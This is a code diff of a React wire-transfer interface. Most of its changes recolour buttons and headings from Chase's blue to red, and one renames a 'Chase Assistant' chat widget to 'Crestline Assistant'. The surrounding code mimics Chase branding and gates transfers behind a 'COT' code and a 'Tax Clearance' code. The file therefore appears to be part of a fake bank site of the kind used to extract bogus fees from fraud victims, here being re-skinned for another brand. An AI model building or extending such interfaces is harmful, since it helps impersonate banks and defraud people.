@@ -1742,7 +1742,7 @@ Thank you for using Chase.
         <Button
           onClick={handleVerifyTax}
           disabled={taxCode.length === 0 || isLoading}
-          className="w-full h-11 bg-[#0a4fa6] hover:bg-[#083d80] font-semibold text-gray-900 transition disabled:opacity-50"
+          className="w-full h-11 bg-[#D71E28] hover:bg-[#A31620] font-semibold text-gray-900 transition disabled:opacity-50"
         >
           {isLoading ? (
             <>
@@ -1759,7 +1759,7 @@ Thank you for using Chase.
 
         {/* Info Box */}
         <div className="bg-muted/50 p-4 rounded-lg text-sm space-y-2">
-          <h4 className="font-semibold text-[#0a4fa6]">Tax Clearance Required</h4>
+          <h4 className="font-semibold text-[#D71E28]">Tax Clearance Required</h4>
           <p className="text-muted-foreground text-xs leading-relaxed">
             For compliance with financial regulations, wire transfers require tax clearance verification. This ensures the funds are legally cleared for transfer and comply with anti-money laundering (AML) requirements.
           </p>
@@ -1789,7 +1789,7 @@ Thank you for using Chase.
 
         {/* Quick Help */}
         <div className="bg-muted/50 rounded-lg p-4 space-y-3">
-          <p className="text-xs font-semibold text-[#0a4fa6] uppercase tracking-wide">Need Help?</p>
+          <p className="text-xs font-semibold text-[#D71E28] uppercase tracking-wide">Need Help?</p>
           <div className="grid grid-cols-2 gap-2">
             {[
               "What is Tax Clearance?",
@@ -1800,7 +1800,7 @@ Thank you for using Chase.
               <button
                 key={question}
                 onClick={() => handleQuickQuestion(question)}
-                className="text-xs px-3 py-2 rounded-lg bg-white dark:bg-slate-800 text-[#0a4fa6] hover:bg-blue-50 dark:hover:bg-slate-700 transition-colors border border-blue-200 dark:border-slate-700 font-medium"
+                className="text-xs px-3 py-2 rounded-lg bg-white dark:bg-slate-800 text-[#D71E28] hover:bg-blue-50 dark:hover:bg-slate-700 transition-colors border border-blue-200 dark:border-slate-700 font-medium"
               >
                 {question}
               </button>
@@ -1812,8 +1812,8 @@ Thank you for using Chase.
         <div className="border-2 border-blue-200 dark:border-blue-900 rounded-lg bg-gradient-to-b from-blue-50 to-white dark:from-blue-950/20 dark:to-slate-900 overflow-hidden">
           <div className="flex items-center justify-between p-4 border-b border-blue-200 dark:border-blue-900 bg-blue-50 dark:bg-blue-950/30">
             <div className="flex items-center gap-2">
-              <MessageCircle className="h-5 w-5 text-[#0a4fa6]" />
-              <h4 className="font-semibold text-sm text-[#0a4fa6]">Chase Assistant</h4>
+              <MessageCircle className="h-5 w-5 text-[#D71E28]" />
+              <h4 className="font-semibold text-sm text-[#D71E28]">Crestline Assistant</h4>
             </div>
             <Button
               size="sm"
@@ -1837,7 +1837,7 @@ Thank you for using Chase.
                     <div
                       className={`max-w-xs px-4 py-2.5 rounded-lg text-sm leading-relaxed ${
                         msg.sender === "user"
-                          ? "bg-[#0a4fa6] text-gray-900 font-medium rounded-br-none"
+                          ? "bg-[#D71E28] text-gray-900 font-medium rounded-br-none"
                           : "bg-gray-200 dark:bg-gray-700 text-foreground rounded-bl-none"
                       }`}
                     >
@@ -1865,7 +1865,7 @@ Thank you for using Chase.
                   size="sm"
                   onClick={handleAssistantSendMessage}
                   disabled={!assistantInput.trim()}
-                  className="bg-[#0a4fa6] hover:bg-[#083d80] text-gray-900 h-10 px-4 transition disabled:opacity-50"
+                  className="bg-[#D71E28] hover:bg-[#A31620] text-gray-900 h-10 px-4 transition disabled:opacity-50"
                 >
                   <Send className="h-4 w-4" />
                 </Button>
@@ -1882,13 +1882,13 @@ Thank you for using Chase.
   const renderProcessingStep = () => (
     <div className="px-4 py-8 flex flex-col items-center justify-center min-h-[400px] space-y-8">
       <div className="relative">
-        <div className="h-24 w-24 rounded-full bg-gradient-to-br from-[#0a4fa6] to-[#083d80] flex items-center justify-center shadow-lg">
+        <div className="h-24 w-24 rounded-full bg-gradient-to-br from-[#D71E28] to-[#A31620] flex items-center justify-center shadow-lg">
           <Loader2 className="h-12 w-12 text-gray-900 animate-spin" />
         </div>
       </div>
 
       <div className="text-center space-y-3 w-full max-w-md">
-        <h3 className="font-bold text-2xl text-[#0a4fa6]">Processing</h3>
+        <h3 className="font-bold text-2xl text-[#D71E28]">Processing</h3>
         <p className="text-sm text-muted-foreground font-medium h-6 min-h-6">{processingStatus}</p>
       </div>
 
@@ -1901,7 +1901,7 @@ Thank you for using Chase.
         <p className="text-xs text-muted-foreground leading-relaxed">
           Your wire transfer is being securely processed.
           <br />
-          <span className="font-semibold text-[#0a4fa6]">Please do not close this window</span>
+          <span className="font-semibold text-[#D71E28]">Please do not close this window</span>
         </p>
       </div>
     </div>
@@ -1914,7 +1914,7 @@ Thank you for using Chase.
         <div className="h-24 w-24 rounded-full bg-gradient-to-br from-green-100 to-green-50 dark:from-green-900/50 dark:to-green-950/30 flex items-center justify-center mx-auto shadow-lg animate-bounce">
           <CheckCircle2 className="h-12 w-12 text-green-600 dark:text-green-400" />
         </div>
-        <h3 className="font-bold text-2xl text-[#0a4fa6]">Transfer Submitted</h3>
+        <h3 className="font-bold text-2xl text-[#D71E28]">Transfer Submitted</h3>
         <p className="text-sm text-muted-foreground">Your wire transfer has been successfully processed and submitted for delivery.</p>
       </div>
 
@@ -1925,7 +1925,7 @@ Thank you for using Chase.
             <Copy className="h-4 w-4" />
           </Button>
         </div>
-        <p className="font-mono text-lg font-bold text-[#0a4fa6] text-center">{confirmationNumber}</p>
+        <p className="font-mono text-lg font-bold text-[#D71E28] text-center">{confirmationNumber}</p>
       </div>
 
       <div className="bg-card border rounded-lg p-4 space-y-3">
@@ -1989,7 +1989,7 @@ Thank you for using Chase.
             <Copy className="h-4 w-4" />
           </Button>
         </div>
-        <p className="font-mono text-lg font-bold text-[#0a4fa6] text-center">{confirmationNumber}</p>
+        <p className="font-mono text-lg font-bold text-[#D71E28] text-center">{confirmationNumber}</p>
       </div>
 
       <div className="bg-card border rounded-lg p-4 space-y-3">
@@ -2067,7 +2067,7 @@ Thank you for using Chase.
       case "form":
         return (
           <DrawerFooter className="border-t pt-4">
-            <Button onClick={handleProceedToReview} className="w-full bg-[#0a4fa6] hover:bg-[#083d80]">
+            <Button onClick={handleProceedToReview} className="w-full bg-[#D71E28] hover:bg-[#A31620]">
               Continue to Review
             </Button>
           </DrawerFooter>
@@ -2075,7 +2075,7 @@ Thank you for using Chase.
       case "review":
         return (
           <DrawerFooter className="border-t pt-4">
-            <Button onClick={handleProceedToOTP} className="w-full bg-[#0a4fa6] hover:bg-[#083d80]">
+            <Button onClick={handleProceedToOTP} className="w-full bg-[#D71E28] hover:bg-[#A31620]">
               <Shield className="h-4 w-4 mr-2" />
               Continue to Verification
             </Button>
@@ -2086,7 +2086,7 @@ Thank you for using Chase.
           <DrawerFooter className="border-t pt-4">
             <Button
               onClick={handleVerifyOTP}
-              className="w-full bg-[#0a4fa6] hover:bg-[#083d80]"
+              className="w-full bg-[#D71E28] hover:bg-[#A31620]"
               disabled={isLoading || otpCode.length !== 6}
             >
               {isLoading ? (
@@ -2105,7 +2105,7 @@ Thank you for using Chase.
           <DrawerFooter className="border-t pt-4">
             <Button
               onClick={handleVerifyCOT}
-              className="w-full bg-[#0a4fa6] hover:bg-[#083d80]"
+              className="w-full bg-[#D71E28] hover:bg-[#A31620]"
               disabled={isLoading || cotCode.length < 6}
             >
               {isLoading ? (
@@ -2124,7 +2124,7 @@ Thank you for using Chase.
           <DrawerFooter className="border-t pt-4">
             <Button
               onClick={handleVerifyTax}
-              className="w-full bg-[#0a4fa6] hover:bg-[#083d80]"
+              className="w-full bg-[#D71E28] hover:bg-[#A31620]"
               disabled={isLoading || taxCode.length < 8} // Changed length check to 8 as per mock data, could be adjusted
             >
               {isLoading ? (
@@ -2144,7 +2144,7 @@ Thank you for using Chase.
       case "complete":
         return (
           <DrawerFooter className="border-t pt-4">
-            <Button onClick={handleClose} className="w-full bg-[#0a4fa6] hover:bg-[#083d80]">
+            <Button onClick={handleClose} className="w-full bg-[#D71E28] hover:bg-[#A31620]">
               Done
             </Button>
           </DrawerFooter>
@@ -2152,7 +2152,7 @@ Thank you for using Chase.
       case "success": // Footer for the success step
         return (
           <DrawerFooter className="border-t pt-4">
-            <Button onClick={handleClose} className="w-full bg-[#0a4fa6] hover:bg-[#083d80]">
+            <Button onClick={handleClose} className="w-full bg-[#D71E28] hover:bg-[#A31620]">
               Done
             </Button>
           </DrawerFooter>
@@ -2186,7 +2186,7 @@ Thank you for using Chase.
                   <ArrowLeft className="h-5 w-5" />
                 </Button>
               )}
-            <DrawerTitle className="text-[#0a4fa6] font-bold">Wire Transfer</DrawerTitle>
+            <DrawerTitle className="text-[#D71E28] font-bold">Wire Transfer</DrawerTitle>
           </div>
         </DrawerHeader>
 
